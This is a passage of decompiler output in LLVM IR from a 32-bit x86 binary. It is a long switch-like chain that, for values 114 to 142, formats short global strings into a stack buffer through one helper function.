dec_label_pc_804b885:                             ; preds = %dec_label_pc_804b87f
  %v0_804b885 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b885 = zext i8 %v0_804b885 to i32
  store i32 %v1_804b885, i32* @edx, align 4
  %v0_804b88f = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b88f = zext i8 %v0_804b88f to i32
  %v2_804b89e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b89e, i32* @ebx, align 4
  %v5_804b8b0 = call i32 @function_8048c55(i32 %v2_804b89e, i32 ptrtoint ([13 x i8]* @global_var_805af97.156 to i32), i32 %v1_804b88f, i32 %v1_804b885)
  br label %dec_label_pc_804b8b5

dec_label_pc_804b8b5:                             ; preds = %dec_label_pc_804b87f, %dec_label_pc_804b885
  %v13_804b8b5 = icmp eq i32 %v2_804a0a2, 114
  %v1_804b8b9 = icmp eq i1 %v13_804b8b5, false
  br i1 %v1_804b8b9, label %dec_label_pc_804b8eb, label %dec_label_pc_804b8bb

dec_label_pc_804b8bb:                             ; preds = %dec_label_pc_804b8b5
  %v0_804b8bb = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b8bb = zext i8 %v0_804b8bb to i32
  store i32 %v1_804b8bb, i32* @edx, align 4
  %v0_804b8c5 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b8c5 = zext i8 %v0_804b8c5 to i32
  %v2_804b8d4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b8d4, i32* @ebx, align 4
  %v5_804b8e6 = call i32 @function_8048c55(i32 %v2_804b8d4, i32 ptrtoint ([13 x i8]* @global_var_805afa4.157 to i32), i32 %v1_804b8c5, i32 %v1_804b8bb)
  br label %dec_label_pc_804b8eb

dec_label_pc_804b8eb:                             ; preds = %dec_label_pc_804b8b5, %dec_label_pc_804b8bb
  %v13_804b8eb = icmp eq i32 %v2_804a0a2, 115
  %v1_804b8ef = icmp eq i1 %v13_804b8eb, false
  br i1 %v1_804b8ef, label %dec_label_pc_804b921, label %dec_label_pc_804b8f1

dec_label_pc_804b8f1:                             ; preds = %dec_label_pc_804b8eb
  %v0_804b8f1 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b8f1 = zext i8 %v0_804b8f1 to i32
  store i32 %v1_804b8f1, i32* @edx, align 4
  %v0_804b8fb = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b8fb = zext i8 %v0_804b8fb to i32
  %v2_804b90a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b90a, i32* @ebx, align 4
  %v5_804b91c = call i32 @function_8048c55(i32 %v2_804b90a, i32 ptrtoint ([14 x i8]* @global_var_805afb1.158 to i32), i32 %v1_804b8fb, i32 %v1_804b8f1)
  br label %dec_label_pc_804b921

dec_label_pc_804b921:                             ; preds = %dec_label_pc_804b8eb, %dec_label_pc_804b8f1
  %v13_804b921 = icmp eq i32 %v2_804a0a2, 116
  %v1_804b925 = icmp eq i1 %v13_804b921, false
  br i1 %v1_804b925, label %dec_label_pc_804b957, label %dec_label_pc_804b927

dec_label_pc_804b927:                             ; preds = %dec_label_pc_804b921
  %v0_804b927 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b927 = zext i8 %v0_804b927 to i32
  store i32 %v1_804b927, i32* @edx, align 4
  %v0_804b931 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b931 = zext i8 %v0_804b931 to i32
  %v2_804b940 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b940, i32* @ebx, align 4
  %v5_804b952 = call i32 @function_8048c55(i32 %v2_804b940, i32 ptrtoint ([13 x i8]* @global_var_805afbf.159 to i32), i32 %v1_804b931, i32 %v1_804b927)
  br label %dec_label_pc_804b957

dec_label_pc_804b957:                             ; preds = %dec_label_pc_804b921, %dec_label_pc_804b927
  %v13_804b957 = icmp eq i32 %v2_804a0a2, 117
  %v1_804b95b = icmp eq i1 %v13_804b957, false
  br i1 %v1_804b95b, label %dec_label_pc_804b98d, label %dec_label_pc_804b95d

dec_label_pc_804b95d:                             ; preds = %dec_label_pc_804b957
  %v0_804b95d = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b95d = zext i8 %v0_804b95d to i32
  store i32 %v1_804b95d, i32* @edx, align 4
  %v0_804b967 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b967 = zext i8 %v0_804b967 to i32
  %v2_804b976 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b976, i32* @ebx, align 4
  %v5_804b988 = call i32 @function_8048c55(i32 %v2_804b976, i32 ptrtoint ([14 x i8]* @global_var_805afcc.160 to i32), i32 %v1_804b967, i32 %v1_804b95d)
  br label %dec_label_pc_804b98d

dec_label_pc_804b98d:                             ; preds = %dec_label_pc_804b957, %dec_label_pc_804b95d
  %v13_804b98d = icmp eq i32 %v2_804a0a2, 118
  %v1_804b991 = icmp eq i1 %v13_804b98d, false
  br i1 %v1_804b991, label %dec_label_pc_804b9c3, label %dec_label_pc_804b993

dec_label_pc_804b993:                             ; preds = %dec_label_pc_804b98d
  %v0_804b993 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b993 = zext i8 %v0_804b993 to i32
  store i32 %v1_804b993, i32* @edx, align 4
  %v0_804b99d = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b99d = zext i8 %v0_804b99d to i32
  %v2_804b9ac = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b9ac, i32* @ebx, align 4
  %v5_804b9be = call i32 @function_8048c55(i32 %v2_804b9ac, i32 ptrtoint ([14 x i8]* @global_var_805afda.161 to i32), i32 %v1_804b99d, i32 %v1_804b993)
  br label %dec_label_pc_804b9c3

dec_label_pc_804b9c3:                             ; preds = %dec_label_pc_804b98d, %dec_label_pc_804b993
  %v13_804b9c3 = icmp eq i32 %v2_804a0a2, 119
  %v1_804b9c7 = icmp eq i1 %v13_804b9c3, false
  br i1 %v1_804b9c7, label %dec_label_pc_804b9f9, label %dec_label_pc_804b9c9

dec_label_pc_804b9c9:                             ; preds = %dec_label_pc_804b9c3
  %v0_804b9c9 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b9c9 = zext i8 %v0_804b9c9 to i32
  store i32 %v1_804b9c9, i32* @edx, align 4
  %v0_804b9d3 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b9d3 = zext i8 %v0_804b9d3 to i32
  %v2_804b9e2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b9e2, i32* @ebx, align 4
  %v5_804b9f4 = call i32 @function_8048c55(i32 %v2_804b9e2, i32 ptrtoint ([13 x i8]* @global_var_805afe8.162 to i32), i32 %v1_804b9d3, i32 %v1_804b9c9)
  br label %dec_label_pc_804b9f9

dec_label_pc_804b9f9:                             ; preds = %dec_label_pc_804b9c3, %dec_label_pc_804b9c9
  %v13_804b9f9 = icmp eq i32 %v2_804a0a2, 120
  %v1_804b9fd = icmp eq i1 %v13_804b9f9, false
  br i1 %v1_804b9fd, label %dec_label_pc_804ba2f, label %dec_label_pc_804b9ff

dec_label_pc_804b9ff:                             ; preds = %dec_label_pc_804b9f9
  %v0_804b9ff = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b9ff = zext i8 %v0_804b9ff to i32
  store i32 %v1_804b9ff, i32* @edx, align 4
  %v0_804ba09 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804ba09 = zext i8 %v0_804ba09 to i32
  %v2_804ba18 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba18, i32* @ebx, align 4
  %v5_804ba2a = call i32 @function_8048c55(i32 %v2_804ba18, i32 ptrtoint ([13 x i8]* @global_var_805aff5.163 to i32), i32 %v1_804ba09, i32 %v1_804b9ff)
  br label %dec_label_pc_804ba2f

dec_label_pc_804ba2f:                             ; preds = %dec_label_pc_804b9f9, %dec_label_pc_804b9ff
  %v13_804ba2f = icmp eq i32 %v2_804a0a2, 121
  %v1_804ba33 = icmp eq i1 %v13_804ba2f, false
  br i1 %v1_804ba33, label %dec_label_pc_804ba65, label %dec_label_pc_804ba35

dec_label_pc_804ba35:                             ; preds = %dec_label_pc_804ba2f
  %v0_804ba35 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804ba35 = zext i8 %v0_804ba35 to i32
  store i32 %v1_804ba35, i32* @edx, align 4
  %v0_804ba3f = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804ba3f = zext i8 %v0_804ba3f to i32
  %v2_804ba4e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba4e, i32* @ebx, align 4
  %v5_804ba60 = call i32 @function_8048c55(i32 %v2_804ba4e, i32 ptrtoint ([13 x i8]* @global_var_805b002.164 to i32), i32 %v1_804ba3f, i32 %v1_804ba35)
  br label %dec_label_pc_804ba65

dec_label_pc_804ba65:                             ; preds = %dec_label_pc_804ba2f, %dec_label_pc_804ba35
  %v13_804ba65 = icmp eq i32 %v2_804a0a2, 122
  %v1_804ba69 = icmp eq i1 %v13_804ba65, false
  br i1 %v1_804ba69, label %dec_label_pc_804ba9b, label %dec_label_pc_804ba6b

dec_label_pc_804ba6b:                             ; preds = %dec_label_pc_804ba65
  %v0_804ba6b = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804ba6b = zext i8 %v0_804ba6b to i32
  store i32 %v1_804ba6b, i32* @edx, align 4
  %v0_804ba75 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804ba75 = zext i8 %v0_804ba75 to i32
  %v2_804ba84 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba84, i32* @ebx, align 4
  %v5_804ba96 = call i32 @function_8048c55(i32 %v2_804ba84, i32 ptrtoint ([13 x i8]* @global_var_805b00f.165 to i32), i32 %v1_804ba75, i32 %v1_804ba6b)
  br label %dec_label_pc_804ba9b

dec_label_pc_804ba9b:                             ; preds = %dec_label_pc_804ba65, %dec_label_pc_804ba6b
  %v13_804ba9b = icmp eq i32 %v2_804a0a2, 123
  %v1_804ba9f = icmp eq i1 %v13_804ba9b, false
  br i1 %v1_804ba9f, label %dec_label_pc_804bad1, label %dec_label_pc_804baa1

dec_label_pc_804baa1:                             ; preds = %dec_label_pc_804ba9b
  %v0_804baa1 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804baa1 = zext i8 %v0_804baa1 to i32
  store i32 %v1_804baa1, i32* @edx, align 4
  %v0_804baab = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804baab = zext i8 %v0_804baab to i32
  %v2_804baba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804baba, i32* @ebx, align 4
  %v5_804bacc = call i32 @function_8048c55(i32 %v2_804baba, i32 ptrtoint ([13 x i8]* @global_var_805b01c.166 to i32), i32 %v1_804baab, i32 %v1_804baa1)
  br label %dec_label_pc_804bad1

dec_label_pc_804bad1:                             ; preds = %dec_label_pc_804ba9b, %dec_label_pc_804baa1
  %v13_804bad1 = icmp eq i32 %v2_804a0a2, 124
  %v1_804bad5 = icmp eq i1 %v13_804bad1, false
  br i1 %v1_804bad5, label %dec_label_pc_804bb07, label %dec_label_pc_804bad7

dec_label_pc_804bad7:                             ; preds = %dec_label_pc_804bad1
  %v0_804bad7 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804bad7 = zext i8 %v0_804bad7 to i32
  store i32 %v1_804bad7, i32* @edx, align 4
  %v0_804bae1 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804bae1 = zext i8 %v0_804bae1 to i32
  %v2_804baf0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804baf0, i32* @ebx, align 4
  %v5_804bb02 = call i32 @function_8048c55(i32 %v2_804baf0, i32 ptrtoint ([13 x i8]* @global_var_805b029.167 to i32), i32 %v1_804bae1, i32 %v1_804bad7)
  br label %dec_label_pc_804bb07

dec_label_pc_804bb07:                             ; preds = %dec_label_pc_804bad1, %dec_label_pc_804bad7
  %v13_804bb07 = icmp eq i32 %v2_804a0a2, 125
  %v1_804bb0b = icmp eq i1 %v13_804bb07, false
  br i1 %v1_804bb0b, label %dec_label_pc_804bb3d, label %dec_label_pc_804bb0d

dec_label_pc_804bb0d:                             ; preds = %dec_label_pc_804bb07
  %v0_804bb0d = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804bb0d = zext i8 %v0_804bb0d to i32
  store i32 %v1_804bb0d, i32* @edx, align 4
  %v0_804bb17 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804bb17 = zext i8 %v0_804bb17 to i32
  %v2_804bb26 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb26, i32* @ebx, align 4
  %v5_804bb38 = call i32 @function_8048c55(i32 %v2_804bb26, i32 ptrtoint ([13 x i8]* @global_var_805b036.168 to i32), i32 %v1_804bb17, i32 %v1_804bb0d)
  br label %dec_label_pc_804bb3d

dec_label_pc_804bb3d:                             ; preds = %dec_label_pc_804bb07, %dec_label_pc_804bb0d
  %v13_804bb3d = icmp eq i32 %v2_804a0a2, 126
  %v1_804bb41 = icmp eq i1 %v13_804bb3d, false
  br i1 %v1_804bb41, label %dec_label_pc_804bb73, label %dec_label_pc_804bb43

dec_label_pc_804bb43:                             ; preds = %dec_label_pc_804bb3d
  %v0_804bb43 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804bb43 = zext i8 %v0_804bb43 to i32
  store i32 %v1_804bb43, i32* @edx, align 4
  %v0_804bb4d = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804bb4d = zext i8 %v0_804bb4d to i32
  %v2_804bb5c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb5c, i32* @ebx, align 4
  %v5_804bb6e = call i32 @function_8048c55(i32 %v2_804bb5c, i32 ptrtoint ([13 x i8]* @global_var_805b043.169 to i32), i32 %v1_804bb4d, i32 %v1_804bb43)
  br label %dec_label_pc_804bb73

dec_label_pc_804bb73:                             ; preds = %dec_label_pc_804bb3d, %dec_label_pc_804bb43
  %v13_804bb73 = icmp eq i32 %v2_804a0a2, 127
  %v1_804bb77 = icmp eq i1 %v13_804bb73, false
  br i1 %v1_804bb77, label %dec_label_pc_804bba9, label %dec_label_pc_804bb79

dec_label_pc_804bb79:                             ; preds = %dec_label_pc_804bb73
  %v0_804bb79 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804bb79 = zext i8 %v0_804bb79 to i32
  store i32 %v1_804bb79, i32* @edx, align 4
  %v0_804bb83 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804bb83 = zext i8 %v0_804bb83 to i32
  %v2_804bb92 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb92, i32* @ebx, align 4
  %v5_804bba4 = call i32 @function_8048c55(i32 %v2_804bb92, i32 ptrtoint ([13 x i8]* @global_var_805b050.170 to i32), i32 %v1_804bb83, i32 %v1_804bb79)
  br label %dec_label_pc_804bba9

dec_label_pc_804bba9:                             ; preds = %dec_label_pc_804bb73, %dec_label_pc_804bb79
  %v10_804bba9 = icmp eq i32 %v2_804a0a2, 128
  %v1_804bbb0 = icmp eq i1 %v10_804bba9, false
  br i1 %v1_804bbb0, label %dec_label_pc_804bbe2, label %dec_label_pc_804bbb2

dec_label_pc_804bbb2:                             ; preds = %dec_label_pc_804bba9
  %v0_804bbb2 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804bbb2 = zext i8 %v0_804bbb2 to i32
  store i32 %v1_804bbb2, i32* @edx, align 4
  %v0_804bbbc = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804bbbc = zext i8 %v0_804bbbc to i32
  %v2_804bbcb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bbcb, i32* @ebx, align 4
  %v5_804bbdd = call i32 @function_8048c55(i32 %v2_804bbcb, i32 ptrtoint ([13 x i8]* @global_var_805b05d.171 to i32), i32 %v1_804bbbc, i32 %v1_804bbb2)
  br label %dec_label_pc_804bbe2

dec_label_pc_804bbe2:                             ; preds = %dec_label_pc_804bba9, %dec_label_pc_804bbb2
  %v13_804bbe2 = icmp eq i32 %v2_804a0a2, 129
  %v1_804bbe9 = icmp eq i1 %v13_804bbe2, false
  br i1 %v1_804bbe9, label %dec_label_pc_804bc1b, label %dec_label_pc_804bbeb

dec_label_pc_804bbeb:                             ; preds = %dec_label_pc_804bbe2
  %v0_804bbeb = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804bbeb = zext i8 %v0_804bbeb to i32
  store i32 %v1_804bbeb, i32* @edx, align 4
  %v0_804bbf5 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804bbf5 = zext i8 %v0_804bbf5 to i32
  %v2_804bc04 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc04, i32* @ebx, align 4
  %v5_804bc16 = call i32 @function_8048c55(i32 %v2_804bc04, i32 ptrtoint ([13 x i8]* @global_var_805b06a.172 to i32), i32 %v1_804bbf5, i32 %v1_804bbeb)
  br label %dec_label_pc_804bc1b

dec_label_pc_804bc1b:                             ; preds = %dec_label_pc_804bbe2, %dec_label_pc_804bbeb
  %v13_804bc1b = icmp eq i32 %v2_804a0a2, 130
  %v1_804bc22 = icmp eq i1 %v13_804bc1b, false
  br i1 %v1_804bc22, label %dec_label_pc_804bc54, label %dec_label_pc_804bc24

dec_label_pc_804bc24:                             ; preds = %dec_label_pc_804bc1b
  %v0_804bc24 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804bc24 = zext i8 %v0_804bc24 to i32
  store i32 %v1_804bc24, i32* @edx, align 4
  %v0_804bc2e = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804bc2e = zext i8 %v0_804bc2e to i32
  %v2_804bc3d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc3d, i32* @ebx, align 4
  %v5_804bc4f = call i32 @function_8048c55(i32 %v2_804bc3d, i32 ptrtoint ([13 x i8]* @global_var_805b077.173 to i32), i32 %v1_804bc2e, i32 %v1_804bc24)
  br label %dec_label_pc_804bc54

dec_label_pc_804bc54:                             ; preds = %dec_label_pc_804bc1b, %dec_label_pc_804bc24
  %v13_804bc54 = icmp eq i32 %v2_804a0a2, 131
  %v1_804bc5b = icmp eq i1 %v13_804bc54, false
  br i1 %v1_804bc5b, label %dec_label_pc_804bc8d, label %dec_label_pc_804bc5d

dec_label_pc_804bc5d:                             ; preds = %dec_label_pc_804bc54
  %v0_804bc5d = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804bc5d = zext i8 %v0_804bc5d to i32
  store i32 %v1_804bc5d, i32* @edx, align 4
  %v0_804bc67 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804bc67 = zext i8 %v0_804bc67 to i32
  %v2_804bc76 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc76, i32* @ebx, align 4
  %v5_804bc88 = call i32 @function_8048c55(i32 %v2_804bc76, i32 ptrtoint ([13 x i8]* @global_var_805b084.174 to i32), i32 %v1_804bc67, i32 %v1_804bc5d)
  br label %dec_label_pc_804bc8d

dec_label_pc_804bc8d:                             ; preds = %dec_label_pc_804bc54, %dec_label_pc_804bc5d
  %v13_804bc8d = icmp eq i32 %v2_804a0a2, 132
  %v1_804bc94 = icmp eq i1 %v13_804bc8d, false
  br i1 %v1_804bc94, label %dec_label_pc_804bcc6, label %dec_label_pc_804bc96

dec_label_pc_804bc96:                             ; preds = %dec_label_pc_804bc8d
  %v0_804bc96 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804bc96 = zext i8 %v0_804bc96 to i32
  store i32 %v1_804bc96, i32* @edx, align 4
  %v0_804bca0 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804bca0 = zext i8 %v0_804bca0 to i32
  %v2_804bcaf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bcaf, i32* @ebx, align 4
  %v5_804bcc1 = call i32 @function_8048c55(i32 %v2_804bcaf, i32 ptrtoint ([13 x i8]* @global_var_805b091.175 to i32), i32 %v1_804bca0, i32 %v1_804bc96)
  br label %dec_label_pc_804bcc6

dec_label_pc_804bcc6:                             ; preds = %dec_label_pc_804bc8d, %dec_label_pc_804bc96
  %v13_804bcc6 = icmp eq i32 %v2_804a0a2, 133
  %v1_804bccd = icmp eq i1 %v13_804bcc6, false
  br i1 %v1_804bccd, label %dec_label_pc_804bcff, label %dec_label_pc_804bccf

dec_label_pc_804bccf:                             ; preds = %dec_label_pc_804bcc6
  %v0_804bccf = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804bccf = zext i8 %v0_804bccf to i32
  store i32 %v1_804bccf, i32* @edx, align 4
  %v0_804bcd9 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804bcd9 = zext i8 %v0_804bcd9 to i32
  %v2_804bce8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bce8, i32* @ebx, align 4
  %v5_804bcfa = call i32 @function_8048c55(i32 %v2_804bce8, i32 ptrtoint ([13 x i8]* @global_var_805b09e.176 to i32), i32 %v1_804bcd9, i32 %v1_804bccf)
  br label %dec_label_pc_804bcff

dec_label_pc_804bcff:                             ; preds = %dec_label_pc_804bcc6, %dec_label_pc_804bccf
  %v13_804bcff = icmp eq i32 %v2_804a0a2, 134
  %v1_804bd06 = icmp eq i1 %v13_804bcff, false
  br i1 %v1_804bd06, label %dec_label_pc_804bd38, label %dec_label_pc_804bd08

dec_label_pc_804bd08:                             ; preds = %dec_label_pc_804bcff
  %v0_804bd08 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804bd08 = zext i8 %v0_804bd08 to i32
  store i32 %v1_804bd08, i32* @edx, align 4
  %v0_804bd12 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804bd12 = zext i8 %v0_804bd12 to i32
  %v2_804bd21 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd21, i32* @ebx, align 4
  %v5_804bd33 = call i32 @function_8048c55(i32 %v2_804bd21, i32 ptrtoint ([13 x i8]* @global_var_805b0ab.177 to i32), i32 %v1_804bd12, i32 %v1_804bd08)
  br label %dec_label_pc_804bd38

dec_label_pc_804bd38:                             ; preds = %dec_label_pc_804bcff, %dec_label_pc_804bd08
  %v13_804bd38 = icmp eq i32 %v2_804a0a2, 135
  %v1_804bd3f = icmp eq i1 %v13_804bd38, false
  br i1 %v1_804bd3f, label %dec_label_pc_804bd71, label %dec_label_pc_804bd41

dec_label_pc_804bd41:                             ; preds = %dec_label_pc_804bd38
  %v0_804bd41 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804bd41 = zext i8 %v0_804bd41 to i32
  store i32 %v1_804bd41, i32* @edx, align 4
  %v0_804bd4b = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804bd4b = zext i8 %v0_804bd4b to i32
  %v2_804bd5a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd5a, i32* @ebx, align 4
  %v5_804bd6c = call i32 @function_8048c55(i32 %v2_804bd5a, i32 ptrtoint ([13 x i8]* @global_var_805b0b8.178 to i32), i32 %v1_804bd4b, i32 %v1_804bd41)
  br label %dec_label_pc_804bd71

dec_label_pc_804bd71:                             ; preds = %dec_label_pc_804bd38, %dec_label_pc_804bd41
  %v13_804bd71 = icmp eq i32 %v2_804a0a2, 136
  %v1_804bd78 = icmp eq i1 %v13_804bd71, false
  br i1 %v1_804bd78, label %dec_label_pc_804bdaa, label %dec_label_pc_804bd7a

dec_label_pc_804bd7a:                             ; preds = %dec_label_pc_804bd71
  %v0_804bd7a = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804bd7a = zext i8 %v0_804bd7a to i32
  store i32 %v1_804bd7a, i32* @edx, align 4
  %v0_804bd84 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804bd84 = zext i8 %v0_804bd84 to i32
  %v2_804bd93 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd93, i32* @ebx, align 4
  %v5_804bda5 = call i32 @function_8048c55(i32 %v2_804bd93, i32 ptrtoint ([13 x i8]* @global_var_805b0c5.179 to i32), i32 %v1_804bd84, i32 %v1_804bd7a)
  br label %dec_label_pc_804bdaa

dec_label_pc_804bdaa:                             ; preds = %dec_label_pc_804bd71, %dec_label_pc_804bd7a
  %v13_804bdaa = icmp eq i32 %v2_804a0a2, 137
  %v1_804bdb1 = icmp eq i1 %v13_804bdaa, false
  br i1 %v1_804bdb1, label %dec_label_pc_804bde3, label %dec_label_pc_804bdb3

dec_label_pc_804bdb3:                             ; preds = %dec_label_pc_804bdaa
  %v0_804bdb3 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804bdb3 = zext i8 %v0_804bdb3 to i32
  store i32 %v1_804bdb3, i32* @edx, align 4
  %v0_804bdbd = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804bdbd = zext i8 %v0_804bdbd to i32
  %v2_804bdcc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bdcc, i32* @ebx, align 4
  %v5_804bdde = call i32 @function_8048c55(i32 %v2_804bdcc, i32 ptrtoint ([13 x i8]* @global_var_805b0d2.180 to i32), i32 %v1_804bdbd, i32 %v1_804bdb3)
  br label %dec_label_pc_804bde3

dec_label_pc_804bde3:                             ; preds = %dec_label_pc_804bdaa, %dec_label_pc_804bdb3
  %v13_804bde3 = icmp eq i32 %v2_804a0a2, 138
  %v1_804bdea = icmp eq i1 %v13_804bde3, false
  br i1 %v1_804bdea, label %dec_label_pc_804be1c, label %dec_label_pc_804bdec

dec_label_pc_804bdec:                             ; preds = %dec_label_pc_804bde3
  %v0_804bdec = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804bdec = zext i8 %v0_804bdec to i32
  store i32 %v1_804bdec, i32* @edx, align 4
  %v0_804bdf6 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804bdf6 = zext i8 %v0_804bdf6 to i32
  %v2_804be05 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be05, i32* @ebx, align 4
  %v5_804be17 = call i32 @function_8048c55(i32 %v2_804be05, i32 ptrtoint ([13 x i8]* @global_var_805b0df.181 to i32), i32 %v1_804bdf6, i32 %v1_804bdec)
  br label %dec_label_pc_804be1c

dec_label_pc_804be1c:                             ; preds = %dec_label_pc_804bde3, %dec_label_pc_804bdec
  %v13_804be1c = icmp eq i32 %v2_804a0a2, 139
  %v1_804be23 = icmp eq i1 %v13_804be1c, false
  br i1 %v1_804be23, label %dec_label_pc_804be55, label %dec_label_pc_804be25

dec_label_pc_804be25:                             ; preds = %dec_label_pc_804be1c
  %v0_804be25 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804be25 = zext i8 %v0_804be25 to i32
  store i32 %v1_804be25, i32* @edx, align 4
  %v0_804be2f = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804be2f = zext i8 %v0_804be2f to i32
  %v2_804be3e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be3e, i32* @ebx, align 4
  %v5_804be50 = call i32 @function_8048c55(i32 %v2_804be3e, i32 ptrtoint ([13 x i8]* @global_var_805b0ec.182 to i32), i32 %v1_804be2f, i32 %v1_804be25)
  br label %dec_label_pc_804be55

dec_label_pc_804be55:                             ; preds = %dec_label_pc_804be1c, %dec_label_pc_804be25
  %v13_804be55 = icmp eq i32 %v2_804a0a2, 140
  %v1_804be5c = icmp eq i1 %v13_804be55, false
  br i1 %v1_804be5c, label %dec_label_pc_804be8e, label %dec_label_pc_804be5e

dec_label_pc_804be5e:                             ; preds = %dec_label_pc_804be55
  %v0_804be5e = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804be5e = zext i8 %v0_804be5e to i32
  store i32 %v1_804be5e, i32* @edx, align 4
  %v0_804be68 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804be68 = zext i8 %v0_804be68 to i32
  %v2_804be77 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be77, i32* @ebx, align 4
  %v5_804be89 = call i32 @function_8048c55(i32 %v2_804be77, i32 ptrtoint ([13 x i8]* @global_var_805b0f9.183 to i32), i32 %v1_804be68, i32 %v1_804be5e)
  br label %dec_label_pc_804be8e

dec_label_pc_804be8e:                             ; preds = %dec_label_pc_804be55, %dec_label_pc_804be5e
  %v13_804be8e = icmp eq i32 %v2_804a0a2, 141
  %v1_804be95 = icmp eq i1 %v13_804be8e, false
  br i1 %v1_804be95, label %dec_label_pc_804bec7, label %dec_label_pc_804be97

dec_label_pc_804be97:                             ; preds = %dec_label_pc_804be8e
  %v0_804be97 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804be97 = zext i8 %v0_804be97 to i32
  store i32 %v1_804be97, i32* @edx, align 4
  %v0_804bea1 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804bea1 = zext i8 %v0_804bea1 to i32
  %v2_804beb0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804beb0, i32* @ebx, align 4
  %v5_804bec2 = call i32 @function_8048c55(i32 %v2_804beb0, i32 ptrtoint ([13 x i8]* @global_var_805b106.184 to i32), i32 %v1_804bea1, i32 %v1_804be97)
  br label %dec_label_pc_804bec7

dec_label_pc_804bec7:                             ; preds = %dec_label_pc_804be8e, %dec_label_pc_804be97
  %v13_804bec7 = icmp eq i32 %v2_804a0a2, 142
  %v1_804bece = icmp eq i1 %v13_804bec7, false
  br i1 %v1_804bece, label %dec_label_pc_804bf00, label %dec_label_pc_804bed0

dec_label_pc_804bed0:                             ; preds = %dec_label_pc_804bec7
  %v0_804bed0 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804bed0 = zext i8 %v0_804bed0 to i32
  store i32 %v1_804bed0, i32* @edx, align 4
